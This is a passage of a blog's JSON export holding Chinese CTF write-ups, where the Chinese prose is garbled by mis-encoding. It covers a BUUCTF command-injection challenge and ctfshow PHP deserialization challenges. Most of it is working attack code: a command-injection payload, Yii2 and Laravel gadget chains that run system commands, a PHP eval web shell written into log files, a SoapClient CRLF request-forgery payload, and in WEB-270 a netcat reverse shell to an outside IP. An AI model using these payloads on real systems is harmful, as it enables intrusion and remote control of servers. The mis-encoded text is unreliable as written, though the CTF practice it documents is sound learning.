112ã€EasyBypass\n\n```ruby\n<?php\n\nhighlight_file(__FILE__);\n\n$comm1 = $_GET['comm1'];\n$comm2 = $_GET['comm2'];\n\n\nif(preg_match(\"/\\'|\\`|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|<|\\&[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is\", $comm1))\n    $comm1 = \"\";\nif(preg_match(\"/\\'|\\\"|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|<|\\&[^\\d]|@|\\||ls|\\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is\", $comm2))\n    $comm2 = \"\";\n\n$flag = \"#flag in /flag\";\n\n$comm1 = '\"' . $comm1 . '\"';\n$comm2 = '\"' . $comm2 . '\"';\n\n$cmd = \"file $comm1 $comm2\";\nsystem($cmd);\n?>\n```\n\nç»™äº†æºç  comm1æ²¡æœ‰è¿‡æ»¤tac å› æ­¤æˆ‘ä»¬å°±åœ¨è¿™é‡Œæ„é€ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689248080086-9b602508-dccd-4faa-91e1-1503e8ef5b58.png)\n\nè¿™é“é¢˜ç›®æœ€é‡è¦çš„å°±æ˜¯åˆ©ç”¨é—­åˆçš„æ€æƒ³\n\n`$cmd = \"file $comm1 $comm2\";`è¿™å¥å°±æ˜¯æˆ‘ä»¬é—­åˆé€ƒé€¸çš„æœ€é‡è¦çš„ä¸€å¥\n\nfileéœ€è¦ä¸€ä¸ªæ–‡ä»¶ é‚£ä¹ˆæˆ‘ä»¬å°±ç»™ä»–çš„ä¸€ä¸ªindex.phpç„¶åç”¨\";å»é—­åˆ\n\nä¹Ÿå°±æ˜¯`$cmd = \"file index.php\"; $comm2\";`\n\nå†åŠ ä¸Šæˆ‘ä»¬çš„æ¶æ„ä»£ç  æ„é€ `index.php\";tac /fla?;\"`\n\nåŸå¼å°±ä¼šè¢«æˆ‘ä»¬æ„é€ æˆä»¥ä¸‹ä¸‰æ®µ\n\n```\n$cmd = \"file index.php\";\ntac /fla?;\n\" $comm2\";\n```\n\næˆåŠŸbypass\n\npayloadï¼š`?comm1=index.php\";tac /fla?;\"&comm2=1`\n","categories":["buuctf"]},{"title":"ctfshow-ååºåˆ—åŒ–","url":"/post/4fb535d6.html","content":"\nctfshow-ååºåˆ—åŒ–\n\n<!--more-->\n\n# WEB-254\n\nå°±æ˜¯çœ‹æ‡‚ä»£ç å°±å¯ä»¥äº†ï¼Œå’Œååºåˆ—åŒ–æ²¡å…³ç³»ï¼Œè®©æ¡ä»¶æˆç«‹å°±ç»™flagäº†\n\npaylaod:`?username=xxxxxx&password=xxxxxx`\n\n# WEB-255\n\né€šè¿‡cookieä¼ å‚ååºåˆ—åŒ–è¾¾åˆ°`$isVip=true;`å³å¯\n\npocï¼š\n\n```php\n<?php\nclass ctfShowUser{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public $isVip=true;}\n\n$a = new ctfShowUser();\necho urlencode(serialize($a));\n?>\n```\n\nç„¶åè¯·æ±‚å¦‚ä¸‹ï¼š\n\n```php\nGET /?username=xxxxxx&password=xxxxxx HTTP/1.1\nHost: b1e5d003-80d4-4a98-b405-4ce5b5c72282.challenge.ctf.show\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\nreferer: http://b1e5d003-80d4-4a98-b405-4ce5b5c72282.challenge.ctf.show/\nConnection: close\n```\n\n# WEB-256\n\nåœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šä½¿å¾—usernameä¸passwordä¸ç›¸ç­‰ é€šè¿‡ååºåˆ—åŒ–å®ç°å³å¯\n\npoc: è¿™é‡Œæœ€å¥½ä¸è¦å°†å€¼è®¾ä¸ºæ•°å­—ä¼šæ‰“ä¸é€šçš„\n\n```php\nclass ctfShowUser{\n    public $username='a';\n    public $password='xxxxxx';\n    public $isVip=true;}\n\n$a = new ctfShowUser();\necho urlencode(serialize($a));\n?>\n```\n\nè¯·æ±‚åŒ…å¦‚ä¸‹ï¼š\n\n```php\nGET /?username=a&password=xxxxxx HTTP/1.1\nHost: d4976ed7-1dae-4590-a624-a16d69c89609.challenge.ctf.show\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D\nConnection: close\n```\n\n# WEB-257\n\næ€è·¯ï¼š`ctfShowUserç±»çš„__destruct()->backDoorçš„getInfo()`\n\nåˆ©ç”¨æ„é€ å‡½æ•°è¿›è¡Œè¦†ç›–å°±è¡Œäº† \n\npocå¦‚ä¸‹ï¼š\n\n```php\n<?php\nclass ctfShowUser{\n    public $username='a';\n    public $password='xxxxxx';\n    public $isVip=true;\n    private $class;\n    public function __construct(){\n        $this->class=new backDoor();\n    }\n\n}\nclass info{\n    private $user='xxxxxx';\n}\nclass backDoor{\n    private $code='system(\"cat flag.php\");';\n}\n\n$a = new ctfShowUser();\necho urlencode(serialize($a));\n?>\n```\n\nè¯·æ±‚åŒ…ï¼š\n\n```php\nGET /?username=xxxxxx&password=xxxxxx HTTP/1.1\nHost: 7aa30d0e-43ad-4b97-85fe-c4c15056de6d.challenge.ctf.show\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A23%3A%22system%28%22cat+flag.php%22%29%3B%22%3B%7D%7D\nreferer: http://7aa30d0e-43ad-4b97-85fe-c4c15056de6d.challenge.ctf.show/\nConnection: close\n```\n\n\n\n# WEB-258\n\nå¤šäº†ä¸€ä¸ªæ­£åˆ™åŒ¹é…æ¡ä»¶ï¼š`!preg_match('/[oc]:\\d+:/i', $_COOKIE['user'])`\n\nå°±æ˜¯ä¸èƒ½å­˜åœ¨`o:æ•°å­—`çš„å½¢å¼\n\nå› ä¸ºæˆ‘ä»¬åºåˆ—åŒ–å¯¹è±¡åä¼šå‡ºç°è¿™ç§æƒ…å†µ\n\næ‰€ä»¥æˆ‘åªéœ€è¦åœ¨`:`ä¹‹ååŠ ä¸Š`+`å³å¯ å› ä¸ºæµè§ˆå™¨è§£æä¼šæŠŠæˆ‘ä»¬çš„åŠ å·è§£æä¸ºç©ºæ ¼ å°±å¯ä»¥bypassäº†\n\npocå’Œä¸Šåˆ°é¢˜ç›®ä¸€æ · å°±æ˜¯è‡ªå·±æ‰‹åŠ¨æ·»åŠ ä¸¤ä¸ª`+`å³å¯\n\n```\nO:+11:\"ctfShowUser\":4:{s:8:\"username\";s:6:\"xxxxxx\";s:8:\"password\";s:6:\"xxxxxx\";s:5:\"isVip\";b:1;s:5:\"class\";O:+8:\"backDoor\":1:{s:4:\"code\";s:23:\"system(\"cat flag.php\");\";}}\n```\n\næäº¤çš„æ—¶å€™å†urlç¼–ç ä¸€ä¸‹ä¸ç„¶ä¼šå‡ºç°æ­§ä¹‰\n\n# WEB-259(SoapClient)\n\nSoapClienté‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ã€‚  \n\nè¿™é“é¢˜ç›®æœ¬è´¨æˆ‘çœ‹äº†ä¸€ä¸‹wp åˆ©ç”¨SoapClientçš„__callé­”æœ¯æ–¹æ³• \n\nå› ä¸ºæˆ‘ä»¬ç”¨SoapClientç”Ÿæˆçš„å¯¹è±¡ä¸å­˜åœ¨`getFlag()`æ–¹æ³•ï¼Œæ‰€ä»¥å°±ä¼šè‡ªåŠ¨è°ƒç”¨__callé­”æœ¯æ–¹æ³•\n\n```\n__call($func,$args)\n```\n\né»˜è®¤$funcä¸ºä¸å­˜åœ¨å‡½æ•°å $argsä¸ºå‚æ•° å¹¶ä¸”ä»¥æ•°ç»„å½¢å¼  \n\nè¿™é“é¢˜ç›®æœ€å¤§é—®é¢˜å°±æ˜¯æ²¡æ³•ç›´æ¥é€šè¿‡è®¿é—®/flagä¿®æ”¹å…¶xffä¸º127.0.0.1æ¥è¾¾åˆ°æ¡ä»¶\n\næ‰€ä»¥å°±éœ€è¦è¿™ä¸ªå†…ç½®ç±»é…åˆcrlfæ¥æ¨¡æ‹Ÿä¸€ä¸ªè¯·æ±‚åŒ… æ¥è¾¾åˆ°å°†flagå­˜å…¥flag.txtçš„æ¡ä»¶\n\næˆ‘çš„ç†è§£æ˜¯è¿™æ ·\n\nå‚è€ƒ:https://www.xiinnn.com/article/7741c455.html è®²çš„å¾ˆä»”ç»†\n\npoc(å·çš„äººå®¶çš„):\n\n```php\n<?php\n$ua = \"Lxxx\\r\\nX-Forwarded-For: 127.0.0.1,127.0.0.1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 13\\r\\n\\r\\ntoken=ctfshow\";\n$client = new SoapClient(null,array('uri' => 'http://127.0.0.1/' , 'location' => 'http://127.0.0.1/flag.php' , 'user_agent' => $ua));\n\nprint_r(urlencode(serialize($client)));\n```\n\nä¼ å…¥payload ç„¶åè®¿é—®/flag.txtå³å¯\n\npayload:`?vip=O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A128%3A%22Lxxx%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D`\n\n# WEB-260\n\n`?ctfshow=ctfshow_i_love_36D`æ²¡å•¥å¯è¯´çš„\n\n# WEB-261\n\nè¿™é“é¢˜ç›®éœ€è¦æ˜ç™½ä¸¤ä¸ªç‚¹ è™½ç„¶è¿™é“é¢˜ç”¨ä¸åˆ°\n\n-  __serialize() å’Œ __sleep()éƒ½å­˜åœ¨åˆ™åªä¼šè°ƒç”¨ __serialize()ä¸ä¼šè°ƒç”¨__sleep()\n- __unserialize()å’Œ__wake()éƒ½å­˜åœ¨åˆ™åªä¼šè°ƒç”¨__unserialize()ä¸ä¼šè°ƒç”¨__wake()\n\n__invokeæ˜¯ä¸ªè¿·æƒ‘é¡¹\n\næœ€å…³é”®çš„æ˜¯è¿™ä¸ª`$this->code==0x36d`å¼±ç›¸ç­‰ æ‰€ä»¥`877.php=877`\n\npocï¼š\n\n```php\n<?php\nclass ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n}\n$a = new ctfshowvip();\n$a->username = '877.php';\n$a->password ='<?php @eval($_POST[x]);?>';\necho urlencode(serialize($a))\n?>\n```\n\n# WEB-262ï¼Œ264(ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸)\n\nçœ‹åˆ°æœ‰åºåˆ—åŒ–åå­—ç¬¦æ›¿æ¢ ä¸€çœ¼ä¸çœŸå°±æ˜¯å­—ç¬¦ä¸²é€ƒé€¸\n\nè¿™é“é¢˜ç›®å…¶å®ä¼šå°†æˆ‘ä»¬æäº¤çš„å†…å®¹å…ˆåºåˆ—åŒ–ç„¶åå†ååºåˆ—åŒ–\n\nç®€å•demoçœ‹æ‡‚\n\n```php\n<?php\nclass message{\n    public $from=1;\n    public $msg=1;\n    public $to='fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}';# \n    public $token='user';\n}\n$a = new message();\n$b = serialize($a);\necho $b;\necho \"\\n\";\n#echo $c;\nprint_r(unserialize(str_replace('fuck', 'loveU', $b)))\n?>\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688540178216-b4b80ad8-03f9-4c4e-a980-5e28ab85395e.png)\n\npayload:`?f=1&m=1&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D`\t\n\nç„¶åå°†cookieä¿å­˜ä¸‹æ¥ è®¿é—®/message æ‰“å…¥cookieå³å¯è·å¾—flag\n\n# WEB-263(phpsessionåºåˆ—åŒ–)\n\nè®¿é—®/www.zipæºç æ³„éœ²\n\nè¿™é“é¢˜ç›®ä¸€å¼€å§‹æœ€å¤§çš„ç–‘æƒ‘æ˜¯æ˜¯æˆ‘ä»¬æäº¤ä¸Šå»çš„åºåˆ—åŒ–å†…å®¹åœ¨å“ªååºåˆ—åŒ–çš„\n\nç½‘ä¸Šwpåƒç¯‡ä¸€å¾‹æ²¡äººæåŠ\n\næœ€åæˆ‘ä¹Ÿæ²¡å¼„æ˜ç™½ æ„Ÿè§‰åªæœ‰è¿™ä¸ªsessionå¼•æ“ä¼š æ‰€ä»¥æˆ‘ä¹Ÿå°±è¿™ä¹ˆç†è§£äº†\n\nå…ˆæ¥çœ‹ï¼š`ini_set('session.serialize_handler', 'php');`å‚è€ƒï¼šhttps://blog.spoock.com/2016/10/16/php-serialize-problem/\n\nsession.serialize_handleræ˜¯ç”¨æ¥è®¾ç½®sessionçš„åºåˆ—è¯å¼•æ“çš„ï¼Œé™¤äº†é»˜è®¤çš„PHPå¼•æ“ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–å¼•æ“ï¼Œä¸åŒçš„å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚  \n\n- php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼\n- php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼\n- php_serialize(php>5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼\n\nç„¶åç®€å•çš„é€»è¾‘å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æ§åˆ¶sessionå»åºåˆ—åŒ–\n\nåœ¨inc.phpæœ‰\n\n```php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function setStatus($s){\n        $this->status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this->username, \"ä½¿ç”¨\".$this->password.\"ç™»é™†\".($this->status?\"æˆåŠŸ\":\"å¤±è´¥\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    }\n}\n```\n\nä»–çš„ææ„å‡½æ•°å°±æ˜¯æˆ‘ä»¬çš„æ’å…¥ç‚¹\n\nå› ä¸ºè¿™ä¸ªé¢˜ç›®æ˜¯é»˜è®¤çš„å¼•æ“ æ‰€ä»¥sessionæ˜¯ç”¨`|`æ¥åˆ†å‰²é”®å€¼ å€¼ä¸ºserialize()å¤„ç†çš„ç»“æœ\n\npocå¦‚ä¸‹ï¼š\n\n```php\n<?php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __destruct(){\n        file_put_contents(\"log-\".$this->username, \"ä½¿ç”¨\".$this->password.\"ç™»é™†\".($this->status?\"æˆåŠŸ\":\"å¤±è´¥\").\"----\".date_create()->format('Y-m-d H:i:s'));\n    }\n}\n$a = new User();\n$a->username = '1.php';\n$a->password = '<?php @eval($_POST[x]);?>';\necho base64_encode('|'.serialize($a))\n#fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czoyNToiPD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/PiI7czo2OiJzdGF0dXMiO047fQ==\n?>\n```\n\nè®¿é—®index.php cookie[limit]æ‰“å…¥ å†è®¿é—®check.php \n\nç„¶åè®¿é—®æˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶ log-1.php\n\nrceå³å¯\n\n# WEB-265(å–åœ°å€ç¬¦)\n\nè¿™é“é¢˜ç›®ä¸€å¼€å§‹çœ‹ å‘ç°è¿™ä¸ªéšæœºæ•°å‡½æ•°ç»•è¿‡ä¸å» çœ‹äº†wp å¸ˆå‚…ä»¬å¤ªå¼ºäº† \n\nç”¨äº†`&`å–åœ°å€ `$a=&$b`åˆ™å½“bå€¼å˜ aä¹Ÿè·Ÿç€å˜\n\npoc:\n\n```php\n<?php\nclass ctfshowAdmin{\n    public $token;\n    public $password;\n    public function __construct(){\n        $this->token='a';\n        $this->password =&$this->token;\n}}\n$a=new ctfshowAdmin();\necho urlencode(serialize($a));\n#O%3A12%3A%22ctfshowAdmin%22%3A2%3A%7Bs%3A5%3A%22token%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D\n?>\n```\n\n# WEB-266\n\nè¿™é“é¢˜ç›®å¤§å†™ç»•ä¸ªæ­£åˆ™å³å¯ \n\n```php\nGET / HTTP/1.1\nHost: 0df5fa90-8128-463c-b40b-12ed31c48ad8.challenge.ctf.show\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Length: 18\n\nO:7:\"Ctfshow\":0:{}\n```\n\n\n\n# WEB-267(Yii2ååºåˆ—åŒ–é“¾)\n\nyii2æ˜¯phpçš„ä¸€ä¸ªæ¡†æ¶ ç›´æ¥åœ¨ç½‘ä¸Šæ‰¾ç°æˆçš„é“¾å­pocå³å¯\n\né¦–å…ˆé€šè¿‡å¼±å£ä»¤ admin/adminç™»å½• ç„¶åæŸ¥çœ‹about \n\næç¤ºè®¿é—®`?r=site%2Fabout&view-source`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688552009392-f89d43dd-2251-4780-864b-91c362be0e92.png)\n\nç„¶åè¿™é‡ŒæŸ¥çœ‹æºç å¯ä»¥å‘ç°yii2è¿™ä¸ªä¿¡æ¯ å› ä¸ºæ˜¯ååºåˆ—åŒ–æ¨¡å—å˜›ç›´æ¥å»æ‰¾é“¾å­å³å¯\n\nè¿™é“é¢˜æ‰¾åˆ°çš„pocåªèƒ½ç”¨passthruå‡½æ•° å…¶ä»–å‡½æ•°éƒ½ç”¨ä¸äº† æŒºå¥‡æ€ªçš„\n\npocå¦‚ä¸‹ï¼š å‚è€ƒï¼šhttps://www.anquanke.com/post/id/254429 è¿™é‡Œçš„é“¾å­å“ªä¸ªä¸è¡Œæ¢å°±è¡Œäº†\n\n```php\n<?php\n\nnamespace yii\\rest {\n    class CreateAction {\n        public $id;\n        public $checkAccess;\n        public function __construct() {\n            $this->id = 'cat /flag';\n            $this->checkAccess = 'passthru';\n        }\n    }\n}\n\nnamespace Faker {\n    use yii\\rest\\CreateAction;\n    class Generator {\n        protected $formatters;\n        public function __construct() {\n            $this->formatters['close'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace yii\\db {\n    use Faker\\Generator;\n    class BatchQueryResult {\n        private $_dataReader;\n        public function __construct() {\n            $this->_dataReader = new Generator();\n        }\n    }\n}\n\nnamespace {\n    use yii\\db\\BatchQueryResult;\n    echo base64_encode(serialize(new BatchQueryResult()));\n}\n?>\n```\n\npaylaod:\n\n```\n?r=backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoyOiJpZCI7czo5OiJjYXQgL2ZsYWciO3M6MTE6ImNoZWNrQWNjZXNzIjtzOjg6InBhc3N0aHJ1Ijt9aToxO3M6MzoicnVuIjt9fX19\n```\n\n# WEB-268ï¼ˆYii2ååºåˆ—åŒ–é“¾ï¼‰\n\nå‰é¢çš„é“¾å­ä¸è¡Œäº† æ¢ä¸€ä¸ªå°±è¡Œäº†\n\n```php\n<?php\n\nnamespace yii\\rest {\n    class CreateAction {\n        public $checkAccess;\n        public $id;\n        public function __construct() {\n            $this->checkAccess=\"passthru\";\n            $this->id=\"cat /flags\";\n        }\n    }\n}\n\nnamespace Faker {\n    use yii\\rest\\CreateAction;\n    class Generator {\n        protected $formatters;\n        public function __construct() {\n            $this->formatters['isRunning'] = [new CreateAction(), 'run'];\n        }\n\n    }\n}\n\nnamespace Codeception\\Extension {\n    use Faker\\Generator;\n    class RunProcess {\n        private $processes;\n        public function __construct() {\n            $this->processes = [new Generator()];\n        }\n    }\n}\n\nnamespace {\n    use Codeception\\Extension\\RunProcess;\n    echo base64_encode(serialize(new RunProcess()));\n}\n?>\n```\n\n# WEB-269(Yii2ååºåˆ—åŒ–é“¾)\n\nç»§ç»­æ¢ï¼š\n\n```php\n<?php\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this->checkAccess = 'passthru';\n            $this->id = 'cat /flagsa';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            // è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning\n            $this->formatters['render'] = [new CreateAction(), 'run'];\n        }\n    }\n}\n\nnamespace phpDocumentor\\Reflection\\DocBlock\\Tags{\n\n    use Faker\\Generator;\n\n    class See{\n        protected $description;\n        public function __construct()\n        {\n            $this->description = new Generator();\n        }\n    }\n}\nnamespace{\n    use phpDocumentor\\Reflection\\DocBlock\\Tags\\See;\n    class Swift_KeyCache_DiskKeyCache{\n        private $keys = [];\n        private $path;\n        public function __construct()\n        {\n            $this->path = new See;\n            $this->keys = array(\n                \"axin\"=>array(\"is\"=>\"handsome\")\n            );\n        }\n    }\n    // ç”Ÿæˆpoc\n    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));\n}\n```\n\n# WEB-270(Yii2ååºåˆ—åŒ–é“¾)\n\nè¿™æ¬¡ç”¨åå¼¹shell\n\n```php\n<?php\nnamespace yii\\rest {\n    class Action\n    {\n        public $checkAccess;\n    }\n    class IndexAction\n    {\n        public function __construct($func, $param)\n        {\n            $this->checkAccess = $func;\n            $this->id = $param;\n        }\n    }\n}\nnamespace yii\\web {\n    abstract class MultiFieldSession\n    {\n        public $writeCallback;\n    }\n    class DbSession extends MultiFieldSession\n    {\n        public function __construct($func, $param)\n        {\n            $this->writeCallback = [new \\yii\\rest\\IndexAction($func, $param), \"run\"];\n        }\n    }\n}\nnamespace yii\\db {\n    use yii\\base\\BaseObject;\n    class BatchQueryResult\n    {\n        private $_dataReader;\n        public function __construct($func, $param)\n        {\n            $this->_dataReader = new \\yii\\web\\DbSession($func, $param);\n        }\n    }\n}\nnamespace {\n    $exp = new \\yii\\db\\BatchQueryResult('shell_exec', 'nc 8.130.34.53 7777 -e /bin/sh');\n    echo(base64_encode(serialize($exp)));\n}\n?>\n```\n\n# WEB-271(Laravel5.7ååºåˆ—åŒ–)\n\nç›´æ¥ç½‘ä¸Šå«–åˆ©ç”¨é“¾å°±è¡Œäº†\n\nå‚è€ƒï¼šhttps://xz.aliyun.com/t/10578#toc-3\n\n```php\n<?php\n\nnamespace Illuminate\\Foundation\\Testing {\n    class PendingCommand\n    {\n        protected $command;\n        protected $parameters;\n        public $test;\n        protected $app;\n        public function __construct($test, $app, $command, $parameters)\n        {\n            $this->app = $app;\n            $this->test = $test;\n            $this->command = $command;\n            $this->parameters = $parameters;\n        }\n    }\n}\n\nnamespace Faker {\n    class DefaultGenerator\n    {\n        protected $default;\n\n        public function __construct($default = null)\n        {\n            $this->default = $default;\n        }\n    }\n}\n\nnamespace Illuminate\\Foundation {\n    class Application\n    {\n        protected $instances = [];\n\n        public function __construct($instances = [])\n        {\n            $this->instances['Illuminate\\Contracts\\Console\\Kernel'] = $instances;\n        }\n    }\n}\n\nnamespace {\n    $defaultgenerator = new Faker\\DefaultGenerator(array(\"DawnT0wn\" => \"1\"));\n    $app = new Illuminate\\Foundation\\Application();\n    $application = new Illuminate\\Foundation\\Application($app);\n    $pendingcommand = new Illuminate\\Foundation\\Testing\\PendingCommand($defaultgenerator, $application, \"system\", array(\"cat /flag\"));\n    echo urlencode(serialize($pendingcommand));\n}\n?>\n```\n\npost:`data=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bs%3A8%3A%22DawnT0wn%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7D%7D`\n\n# WEB-272~273(Laravel5.8ååºåˆ—åŒ–)\n\npocå¦‚ä¸‹ å‚è€ƒhttps://blog.csdn.net/qq_61991235/article/details/123583489?ydreferer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%3D\n\n```php\n<?php\nnamespace Illuminate\\Broadcasting{\n\n    use Illuminate\\Bus\\Dispatcher;\n    use Illuminate\\Foundation\\Console\\QueuedCommand;\n\n    class PendingBroadcast\n    {\n        protected $events;\n        protected $event;\n        public function __construct(){\n            $this->events=new Dispatcher();\n            $this->event=new QueuedCommand();\n\n        }\n    }\n}\nnamespace Illuminate\\Foundation\\Console{\n    use Mockery\\Generator\\MockDefinition;\n    class QueuedCommand\n    {\n        public $connection;\n        public function __construct()\n        {\n            $this->connection=new MockDefinition();\n        }\n    }\n}\n\nnamespace Mockery\\Generator{\n\n    class MockDefinition{\n        protected $config;\n        protected $code;\n        public function __construct()\n        {\n            $this->code=\"<?php echo system('cat /flag'); exit(); ?>\";\n            $this->config=new MockConfiguration();\n        }\n    }\n    class MockConfiguration{\n        \n    }\n}\n\nnamespace Illuminate\\Bus{\n    